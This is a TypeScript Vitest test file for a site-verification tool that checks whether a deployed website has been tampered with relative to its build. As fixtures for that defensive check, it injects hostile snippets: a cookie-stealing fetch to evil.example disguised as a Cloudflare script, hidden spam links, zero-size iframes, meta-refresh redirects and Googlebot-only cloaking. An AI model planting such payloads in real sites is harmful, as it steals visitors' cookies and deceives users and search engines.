import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { build } from "../src/core/build.js";
import { fingerprint, verifySite } from "../src/checks/verify.js";
import { copyFixture, write } from "./helpers.js";

/** A fake live site that serves the real build output, with optional tampering. */
async function liveSite(tamper: (route: string, html: string, ua: string) => string = (_, h) => h, extraSitemap = "", robots?: (t: string) => string) {
  const root = copyFixture();
  await build(root);
  const dist = path.join(root, "dist");
  const fetched: string[] = [];
  const fake = (async (input: string | URL | Request, init?: RequestInit) => {
    const ua = String((init?.headers as Record<string, string> | undefined)?.["user-agent"] ?? "");
    const url = new URL(String(input));
    fetched.push(url.pathname);
    const file = url.pathname.endsWith("/") ? path.join(dist, url.pathname, "index.html") : path.join(dist, url.pathname);
    if (!fs.existsSync(file)) return new Response("", { status: 404 });
    let body = fs.readFileSync(file, "utf8");
    if (url.pathname === "/sitemap.xml") body = body.replace("</urlset>", `${extraSitemap}</urlset>`);
    else if (url.pathname === "/robots.txt") body = robots ? robots(body) : body;
    else body = tamper(url.pathname, body, ua);
    return new Response(body);
  }) as typeof fetch;
  return { root, fake, fetched };
}

describe("vage verify", () => {
  it("passes when the live site matches the files, ignoring formatting and Cloudflare email protection", async () => {
    const { root, fake } = await liveSite((_, html) => html.replace(/\n\s*/g, "\n").replace("</body>", '<a href="/cdn-cgi/l/email-protection#abc">[email]</a></body>'));
    const result = await verifySite(root, { fetch: fake });
    expect(result).toMatchObject({ ok: true, url: "https://fixture.example" });
    expect(result.pagesChecked).toBeGreaterThan(3);
    expect(result.differences.filter((d) => d.severity === "error")).toEqual([]);
  });

  it("catches injected links and scripts", async () => {
    const { root, fake } = await liveSite((route, html) =>
      route === "/about/" ? html.replace("</body>", '<div style="display:none"><a href="https://casino.example/">casino</a></div><script src="https://evil.example/x.js"></script></body>') : html,
    );
    const result = await verifySite(root, { fetch: fake });
    expect(result.ok).toBe(false);
    const about = result.differences.filter((d) => d.route === "/about/");
    expect(about.map((d) => d.kind)).toEqual(expect.arrayContaining(["links-added", "scripts-added", "text-changed"]));
    expect(about.find((d) => d.kind === "links-added")!.detail).toContain("https://casino.example/");
  });

  it("catches pages added to the live sitemap and pages that are gone", async () => {
    const { root, fake } = await liveSite(
      (route, html) => (route === "/hidden/" ? "" : html),
      "<url><loc>https://fixture.example/cheap-loans/</loc></url>",
    );
    const result = await verifySite(root, { fetch: fake });
    expect(result.differences.find((d) => d.kind === "sitemap-extra")!.detail).toContain("/cheap-loans/");
    expect(result.ok).toBe(false);
  });

  it("reports unreachable pages and needs an origin", async () => {
    const { root } = await liveSite();
    const down = (async () => new Response("", { status: 503 })) as typeof fetch;
    const result = await verifySite(root, { fetch: down, crawlers: false });
    expect(result.differences.every((d) => d.kind === "unreachable")).toBe(true);
    await expect(verifySite(root, { fetch: down, url: "not a url" })).rejects.toThrow(/--url/);
  });

  it("fingerprints links, scripts and text, not markup details", () => {
    const a = fingerprint('<body><p>Hi  there</p><a href="/x">x</a><script>var a=1</script></body>', "https://s.example/p/");
    const b = fingerprint('<body>\n<p>Hi there</p>\n<a  href="https://s.example/x">x</a><script>var a=1</script></body>', "https://s.example/p/");
    expect(a).toEqual(b);
  });
});

describe("vage verify (final review)", () => {
  const inject = (snippet: string, where = "</body>") => (route: string, html: string) => (route === "/about/" ? html.replace(where, `${snippet}${where}`) : html);

  it("catches meta refresh, iframes, swapped canonicals, inline handlers, JSON-LD and forms", async () => {
    for (const [snippet, where] of [
      ['<meta http-equiv="refresh" content="0;url=https://spam.example/">', "</head>"],
      ['<iframe src="https://spam.example/" width="0" height="0"></iframe>', "</body>"],
      ['<link rel="canonical" href="https://spam.example/">', "</head>"],
      ['<img src="/x.png" onload="location=1">', "</body>"],
      ['<script type="application/ld+json">{"sameAs":"https://spam.example/"}</script>', "</head>"],
      ['<form action="https://spam.example/"></form>', "</body>"],
    ]) {
      const { root, fake } = await liveSite(inject(snippet!, where));
      const result = await verifySite(root, { fetch: fake });
      expect(result.ok, snippet).toBe(false);
    }
  });

  it("fails on text-only spam and ignores Cloudflare's own scripts", async () => {
    const spam = await liveSite(inject("<p>buy cheap viagra here</p>"));
    expect((await verifySite(spam.root, { fetch: spam.fake })).differences.find((d) => d.kind === "text-changed")?.severity).toBe("error");
    const cdn = await liveSite((_, html) => html.replace("</body>", '<script src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js"></script></body>'));
    const cdnResult = await verifySite(cdn.root, { fetch: cdn.fake, crawlers: false });
    expect(cdnResult.ok).toBe(true);
    const cdnWarnings = cdnResult.differences.filter((d) => d.kind === "cdn-script").map((d) => d.detail).join("\n");
    expect(cdnWarnings).toContain("static.cloudflareinsights.com/beacon.min.js");
    expect(cdnWarnings).toContain("/cdn-cgi/scripts/");
  });

  it("catches spam shown only to Googlebot, and changes to robots.txt", async () => {
    const cloaked = await liveSite((route, html, ua) => (ua.includes("Googlebot") && route === "/" ? html.replace("</body>", '<a href="https://casino.example/">casino</a></body>') : html));
    const result = await verifySite(cloaked.root, { fetch: cloaked.fake });
    expect(result.differences.find((d) => d.kind === "links-added")!.detail).toMatch(/Only when visited as Googlebot/);
    const robots = await liveSite(undefined, "", (t) => `${t}\nSitemap: https://spam.example/sitemap.xml\n`);
    expect((await verifySite(robots.root, { fetch: robots.fake })).differences.map((d) => d.kind)).toContain("robots-changed");
  });
});

describe("vage verify covers generated files (review)", () => {
  it("checks the live feed and Markdown copies, and counts probed crawlers", async () => {
    const root = copyFixture();
    write(root, "vage.config.ts", 'export default { site: "https://fixture.example", title: "Fixture Site", seo: { markdownCopies: true, feeds: [{ under: "/blog/" }] } };');
    await build(root);
    const dist = path.join(root, "dist");
    const fakeLive = (async (input: string | URL | Request) => {
      const url = new URL(String(input));
      if (url.hostname !== "fixture.example" || url.protocol !== "https:") return new Response("", { status: 301, headers: { location: "https://fixture.example/" } });
      const file = url.pathname.endsWith("/") ? path.join(dist, url.pathname, "index.html") : path.join(dist, url.pathname);
      if (!fs.existsSync(file)) return new Response("", { status: 404 });
      let body = fs.readFileSync(file, "utf8");
      if (url.pathname === "/about.md") body += "\nBuy cheap viagra here.\n";
      if (url.pathname === "/blog/feed.xml") body = body.replace("</channel>", "<item><title>Casino bonus</title></item></channel>");
      return new Response(body);
    }) as typeof fetch;
    const result = await verifySite(root, { fetch: fakeLive });
    expect(result.differences.find((d) => d.route === "/about.md")).toMatchObject({ severity: "error", kind: "text-changed" });
    expect(result.differences.find((d) => d.route === "/blog/feed.xml")).toMatchObject({ severity: "error" });
    expect(result.crawlersChecked).toBeGreaterThan(5);
  });
});

describe("vage verify re-review fixes", () => {
  const inject = (snippet: string) => (route: string, html: string) => (route === "/about/" ? html.replace("</body>", `${snippet}</body>`) : html);
  it("reports scripts and links that only pretend to be Cloudflare's", async () => {
    for (const snippet of [
      '<script>/* /cdn-cgi/ */ fetch("https://evil.example/?c="+document.cookie)</script>',
      '<script src="/cdn-cgi/evil.js"></script>',
      '<a href="/cdn-cgi/redirect?to=https://spam.example/">x</a>',
    ]) {
      const { root, fake } = await liveSite(inject(snippet));
      const result = await verifySite(root, { fetch: fake, crawlers: false });
      expect(result.ok, snippet).toBe(false);
    }
  });

  it("treats any link added to a live feed or Markdown copy as an error", async () => {
    const root = copyFixture();
    write(root, "vage.config.ts", 'export default { site: "https://fixture.example", title: "Fixture Site", seo: { markdownCopies: true } };');
    await build(root);
    const dist = path.join(root, "dist");
    const live = (async (input: string | URL | Request) => {
      const url = new URL(String(input));
      const file = url.pathname.endsWith("/") ? path.join(dist, url.pathname, "index.html") : path.join(dist, url.pathname);
      if (!fs.existsSync(file)) return new Response("", { status: 404 });
      const body = fs.readFileSync(file, "utf8");
      return new Response(url.pathname === "/about.md" ? `${body}\nSee [our partner](https://quiet-link.example/).\n` : body);
    }) as typeof fetch;
    const result = await verifySite(root, { fetch: live, crawlers: false });
    expect(result.differences.find((d) => d.route === "/about.md" && d.kind === "links-added")?.severity).toBe("error");
  });
});
